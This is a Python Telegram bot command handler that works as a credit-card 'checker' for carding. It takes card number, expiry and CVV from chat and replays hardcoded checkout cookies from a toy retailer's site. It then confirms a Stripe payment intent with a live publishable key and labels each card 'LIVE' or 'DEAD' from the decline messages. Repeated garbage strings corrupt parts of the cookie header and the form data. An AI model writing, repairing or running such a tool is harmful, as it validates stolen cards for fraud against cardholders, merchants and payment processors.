@iniciar.message_handler(commands= ["ab"], commands_prefix=comand)
async def chk(message: types.Message):
    ini = time.perf_counter()
    ccs = message.text[len('/ab '):]

    if not ccs:
           await message.reply("ESTA INGRESAANDO MAL LA CCS")

    spli = ccs.split('|')
    cc = spli[0]
    mes = spli[1]
    ano = spli[2]
    cvv = spli[3]

    nombre = "juan manuel santos"
    mail = "manueljaunsantos@gmail.com"

    cookies = {
    'dwac_eb83b5445ceb01c63da9991926': '7h2StYocULNPzAkTEaYB2AyPBCp9gmUTr_o%3D|dw-only|||USD|false|US%2FEastern|true',
    'cqcid': 'acsGRQnukGKuoSAlTcFn2alPQF',
    'cquid': '||',
    'sid': '7h2StYocULNPzAkTEaYB2AyPBCp9gmUTr_o',
    'dwanonymous_b9304412fd308f62a1edbd377f59f3b6': 'acsGRQnukGKuoSAlTcFn2alPQF',
    '__cq_dnt': '0',
    'dw_dnt': '0',
    'dwsid': 'oXj5Dmlut4AgCY9VhakygkPqb5Ge8IIgwD-uwigFOl-tbTvoa7YOinwLSzK_BX0c1ofQ-ky97t2p3EeeIMm6Ig==',
    '_gid': 'GA1.2.1075257567.1663292859',
    '__cq_uuid': 'acsGRQnukGKuoSAlTcFn2alPQF',
    '_fbp': 'fb.1.1663292861278.672876947',
    '_pin_unauth': 'dWlkPU1EaGhORFU0WmpBdFlqRXhOUzAwTjJVM0xUZ3daRGt0TVRoaU5qTXlOalprTWpWaw',
    'BVBRANDID': 'e3ec22d3-c7ff-4204-9c6e-3b19a1959858',
    'BVBRANDSID': '10cb540e-b786-4d74-87f5-ca579606a640',
    '__stripe_mid': 'c1331236-3c34-452d-b1e5-dd84de0dd87a5ff119',
    '__stripe_sid': '32e98acc-3a46-4b4a-a908-f6f8ec519082760817',
    'BVImplmain_site': '19940',
    '__cq_bc': '%7B%22bdmt-ToysRUs%22%3A%5B%7B%22id%22%3A%2212871932%22%7D%2C%7B%22id%22%3A%2212894051%22%7D%2C%7B%22id%22%3A%2213220600%22%7D%5D%7D',
    'cookieconsent_status': 'dismiss',
    '_ga': 'GA1.2.1211159942.1663292858',
    '__cq_seg': '0~0.18!1~-0.39!2~-0.09!3~-0.16!4~0.24!5~-0.36!6~0.22!7~0.58!8~0.27!9~-0.37!f0~3~2!n0~3',
    '_derived_epik': 'dj0yJnU9RUpENk9KY0xoYUtlTUZGa3FIRlRtSDNVXzlaelhXRTImbj1qejh5UDVHVmZaWHlCSHlIOHBPVGhnJm09MSZ0PUFBQUFBR01qMW1FJnJtPTEmcnQ9QUFBQUFHTWoxbUU',
    '_ga_98G3HYFZT4': 'GS1.1.1663292857.1.1.1663293984.0.0.0',}

    headers = {
    'authority': 'www.toysrus.com',
    'accept': '*/*',
    'accept-language': 'es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    # Already added when you pass json=
    # 'content-type': 'application/json',
    # Requests sorts cookies= alphabetically
    # 'cookie': 'dwac_eb83b5445ceb01c63da9991926=7h2StYocULNPzAkTEaYB2AyPBCp9gmUTr_o%3D|dw-only|||USD|false|US%2FEastern|true; cqcid=acsGRQnukGKuoSAlTcFn2alPQF; cquid=||; sid=7h2StYocULNPzAkTEaYB2AyPBCp9gmUTr_o; dwanonymous_b9304412fd308f62a1edbd377f59f3b6=acsGRQnukGKuoSAlTcFn2alPQF; __cq_dnt=0; dw_dnt=0; dwsid=oXj5Dmlut4AgCY9VhakygkPqb5Ge8IIgwD-uwigFOl-tbTvoa7YOinwLSzK_BX0c1ofQ-ky97t2p3EeeIMm6Ig==; _gid=GA1.2.1075257567.1663292859; __cq_uuid=acsGRQnukGKuoSAlTcFn2alPQF; _fbp=fb.1.1663292861278.672876947; _pin_unauth=dWlkPU1EaGhORFU0WmpBdFlqRXhOUzAwTjJVM0xUZ3daRGt0TVRoaU5qTXlOalprTWpWaw; BVBRANDID=e3ec22d3-c7ff-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVb1e5-dd84de0dd87a5ff119; __stripe_sid=32e98acc-3a46-4b4a-a908-f6f8ec519082760817; BVImplmain_site=19940; __cq_bc=%7B%22bdmt-ToysRUs%22%3A%5B%7B%22id%22%3A%2212871932%22%7D%2C%7B%22id%22%3A%2212894051%22%7D%2C%7B%22id%22%3A%2213220600%22%7D%5D%7D; cookieconsent_status=dismiss; _ga=GA1.2.1211159942.1663292858; __cq_seg=0~0.18!1~-0.39!2~-0.09!3~-0.16!4~0.24!5~-0.36!6~0.22!7~0.58!8~0.27!9~-0.37!f0~3~2!n0~3; _derived_epik=dj0yJnU9RUpENk9KY0xoYUtlTUZGa3FIRlRtSDNVXzlaelhXRTImbj1qejh5UDVHVmZaWHlCSHlIOHBPVGhnJm09MSZ0PUFBQUFBR01qMW1FJnJtPTEmcnQ9QUFBQUFHTWoxbUU; _ga_98G3HYFZT4=GS1.1.1663292857.1.1.1663293984.0.0.0',
    'origin': 'https://www.toysrus.com',
    'referer': 'https://www.toysrus.com/on/demandware.store/Sites-ToysRUs-Site/en_US/Checkout-Begin?stage=payment',
    'sec-ch-ua': '"Microsoft Edge";v="105", " Not;A Brand";v="99", "Chromium";v="105"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33',}

    json_data = {
    'paymentMethodType': 'card',
    'stripeCustomerRequired': True,
    'zoneId': 'default',
    'statementDescriptor': None,}

    response2 = requests.post('https://www.toysrus.com/on/demandware.store/Sites-ToysRUs-Site/en_US/__SYSTEM__SalesforcePayments-PreparePaymentIntent', cookies=cookies, headers=headers, json=json_data).json()
 
    CS = response2["clientSecret"]
    PI =CS.split('_sec')[0]
    #await message.reply(f"PI={PI}")


    #await message.reply(f"{CS}")


    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Microsoft Edge";v="105", " Not;A Brand";v="99", "Chromium";v="105"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33',}

    data = f'setup_future_usage=off_session&payment_method_data[type]=card&payment_method_data[billing_details][address][line1]=strate+4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVstate]=NY&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][email]=testnici1%4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVphone]=4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVcard][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]=37ae7a60-ea56-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVpayment_method_data[sid]=32e98acc-3a46-4b4a-a908-f6f8ec519082760817&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fc58a815e4%3B+stripe-js-v3%2Fc58a815e4&payment_method_data[time_on_page]=107717&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51HbsUNBP9OQuEIrPQTov2wZCQlEOC0EniZrH71zXu970tAaLxliYcvffDyHgP3wO9xrKbrfY4TGDVgViEUjwQ4mL00oKOvo8WJ&_stripe_account=acct_1JNK02Pl154QSdJg&client_secret={CS}'

    response = requests.post(f'https://api.stripe.com/v1/payment_intents/{PI}/confirm', headers=headers, data=data).json()

    error = response["error"]
    codel = error["code"]
    messagea = error["message"]

    #await message.reply(f"{messagea}")
    if 'Your card has insufficient funds.' in messagea:
        await message.reply(f"""
<b>CVV LIVE ?
CC : <code>{ccs}</code>
Code : {codel}
Mensage : {messagea}</b>""")

    elif 'incorrect_cvc'in codel:
        await message.reply(f"""
<b>CCN LIVE ?
CC : <code>{ccs}</code>
Code : {codel}
Mensage : {messagea}</b>
    """)
    elif 'Your card does not support this type of purchase.' in messagea:
        await message.reply(f"""
<b>CC DEAD ?
CC : <code>{ccs}</code>
Code : {codel}
Mensage : {messagea}</b>""")


    elif 'Your card was declined.' in messagea:
        await message.reply(f"""
<b>CC DEAD ?
CC : <code>{ccs}</code>
Code : {codel}
Mensage : {messagea}</b>""")
    elif 'incorrect_number' in codel:
        await message.reply(f"""
<b>CC DEAD ?
CC : <code>{ccs}</code>
Code : {codel}
Mensage : {messagea}</b>""")
    elif 'invalid_cvc' in codel:
        await message.reply(f"""
<b>CC DEAD ?
CC : <code>{ccs}</code>
Code : {codel}
Mensage : {messagea}</b>""")


    else:
        await message.reply(f"""

<b>CC Live ?
CC : <code>{ccs}</code> 
Mensage : Aprovado</b>
""")